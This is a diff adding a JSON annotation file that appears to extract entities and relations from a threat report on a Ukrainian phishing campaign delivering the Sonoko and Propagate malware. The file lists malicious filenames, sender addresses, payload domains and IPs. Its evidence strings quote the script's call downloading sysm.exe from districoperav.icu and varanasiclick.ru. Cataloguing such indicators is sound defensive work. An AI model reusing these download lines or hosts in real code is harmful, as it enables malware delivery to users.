@@ -1,0 +1,206 @@
+{
+  "entities": [
+    {
+      "name": "Sonoko",
+      "kind": "malware family",
+      "gloss": "A JavaScript-based trojan downloader used to execute and deliver secondary payloads."
+    },
+    {
+      "name": "Propagate",
+      "kind": "malware family",
+      "gloss": "A trojan executable that provides remote access, modifies settings, and acts as a socket server."
+    },
+    {
+      "name": "рахунки компания технік.zip",
+      "kind": "file",
+      "gloss": "A malicious ZIP archive distributed via phishing emails."
+    },
+    {
+      "name": "За текущий месяц рах.ф. Спецбуд.lzh",
+      "kind": "file",
+      "gloss": "A malicious LZH archive attached to phishing emails."
+    },
+    {
+      "name": "Компания.png",
+      "kind": "file",
+      "gloss": "An image file contained inside the malicious archive."
+    },
+    {
+      "name": "рахунки компания технік.lzh",
+      "kind": "file",
+      "gloss": "A malicious archive file contained within the initial ZIP attachment."
+    },
+    {
+      "name": "зг. дог рах. фак 708.js",
+      "kind": "file",
+      "gloss": "A malicious JavaScript script that downloads and executes an executable payload."
+    },
+    {
+      "name": "07.11.18р список.docx",
+      "kind": "file",
+      "gloss": "A decoy Microsoft Word document opened to conceal malicious activity."
+    },
+    {
+      "name": "sysm.exe",
+      "kind": "file",
+      "gloss": "A malicious executable payload that waits for remote commands via socket connections."
+    },
+    {
+      "name": "рахунки ООО Спецстрой.xls.js",
+      "kind": "file",
+      "gloss": "A malicious JavaScript script file involved in the phishing campaign."
+    },
+    {
+      "name": "Адресса отгрузки.xlsx",
+      "kind": "file",
+      "gloss": "A document file identified as an indicator of compromise."
+    },
+    {
+      "name": "966449.exe",
+      "kind": "file",
+      "gloss": "A malicious executable file written to the system templates directory."
+    },
+    {
+      "name": "223329.exe",
+      "kind": "file",
+      "gloss": "A malicious executable file dropped in the AppData directory."
+    },
+    {
+      "name": "fortshritt@zp.ukrtel.net",
+      "kind": "email address",
+      "gloss": "An email address used by threat actors to distribute phishing messages."
+    },
+    {
+      "name": "a-prom@sm.ukrtel.net",
+      "kind": "email address",
+      "gloss": "An email address used to send malicious emails."
+    },
+    {
+      "name": "districoperav.icu",
+      "kind": "hostname",
+      "gloss": "A command-and-control and payload hosting domain used to deliver malware."
+    },
+    {
+      "name": "varanasiclick.ru",
+      "kind": "hostname",
+      "gloss": "A command-and-control and payload hosting domain used in the campaign."
+    },
+    {
+      "name": "188.225.10.43",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious domain districoperav.icu."
+    },
+    {
+      "name": "185.224.249.70",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the malicious domain varanasiclick.ru."
+    },
+    {
+      "name": "5.8.0.2",
+      "kind": "ip address",
+      "gloss": "An encoded IP address associated with a free VPN service."
+    },
+    {
+      "name": "15.3.0.10",
+      "kind": "ip address",
+      "gloss": "An encoded IP address identified in the malware code."
+    },
+    {
+      "name": "nx0.ru",
+      "kind": "domain name",
+      "gloss": "An internet domain hosting a free VPN service."
+    }
+  ],
+  "relations": [
+    {
+      "head": "рахунки компания технік.zip",
+      "type": "contains-file",
+      "tail": "Компания.png",
+      "evidence": "“рахунки компания технік.zip” містить файл “Компания.png”"
+    },
+    {
+      "head": "рахунки компания технік.zip",
+      "type": "contains-file",
+      "tail": "рахунки компания технік.lzh",
+      "evidence": "“рахунки компания технік.zip” містить файл “Компания.png” та архівний файл “рахунки компания технік.lzh”"
+    },
+    {
+      "head": "рахунки компания технік.lzh",
+      "type": "executes",
+      "tail": "зг. дог рах. фак 708.js",
+      "evidence": "архівний файл “рахунки компания технік.lzh”, який при активуванні запускає javascript “зг. дог рах. фак 708.js”"
+    },
+    {
+      "head": "рахунки компания технік.lzh",
+      "type": "opens-decoy",
+      "tail": "07.11.18р список.docx",
+      "evidence": "а для прикриття відкриває Word документ “07.11.18р список.docx”"
+    },
+    {
+      "head": "зг. дог рах. фак 708.js",
+      "type": "downloads",
+      "tail": "sysm.exe",
+      "evidence": "В результі виконання javascript “зг. дог рах. фак 708.js” завантажується виконувана програма sysm.exe"
+    },
+    {
+      "head": "districoperav.icu",
+      "type": "hosts-payload",
+      "tail": "sysm.exe",
+      "evidence": "HTTP.Open(\"GET\", \"http://districoperav.icu/neifo/sysm.exe\""
+    },
+    {
+      "head": "varanasiclick.ru",
+      "type": "hosts-payload",
+      "tail": "sysm.exe",
+      "evidence": "HTTP.Open(\"GET\", \"http://varanasiclick.ru/neifo/sysm.exe\""
+    },
+    {
+      "head": "districoperav.icu",
+      "type": "resolves-to-ip",
+      "tail": "188.225.10.43",
+      "evidence": "districoperav.icu (188.225.10.43 (RU))"
+    },
+    {
+      "head": "varanasiclick.ru",
+      "type": "resolves-to-ip",
+      "tail": "185.224.249.70",
+      "evidence": "varanasiclick.ru (185.224.249.70 (RU))"
+    },
+    {
+      "head": "5.8.0.2",
+      "type": "associated-with-domain",
+      "tail": "nx0.ru",
+      "evidence": "з адреси 5.8.0.2 забезпечується Freevpn service на nx0.ru"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "contains-file",
+      "definition": "Specifies that an archive or container file contains a designated sub-file."
+    },
+    {
+      "name": "executes",
+      "definition": "Indicates that an entity launches or executes another script or program."
+    },
+    {
+      "name": "opens-decoy",
+      "definition": "Specifies that an entity opens a decoy document to mislead the user."
+    },
+    {
+      "name": "downloads",
+      "definition": "Indicates that a script or program retrieves a file from a remote server."
+    },
+    {
+      "name": "hosts-payload",
+      "definition": "Specifies that an internet domain or server hosts a malicious payload."
+    },
+    {
+      "name": "resolves-to-ip",
+      "definition": "Indicates that a domain name resolves to a specified IP address."
+    },
+    {
+      "name": "associated-with-domain",
+      "definition": "Specifies that an IP address is linked to or provides a service hosted under a given domain."
+    }
+  ]
+}
